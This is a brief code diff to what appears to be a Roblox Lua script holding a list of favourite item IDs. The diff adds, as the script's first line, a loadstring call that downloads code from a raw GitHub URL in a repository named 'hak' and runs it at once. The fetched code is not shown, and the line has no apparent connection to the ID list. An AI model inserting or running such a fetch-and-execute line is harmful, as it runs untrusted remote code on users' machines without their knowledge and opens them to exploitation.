@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pepfre12/hak/main/yassnewreanim"))()
 
 local FavIDs = {
 	340106355, --Nefl Crystals
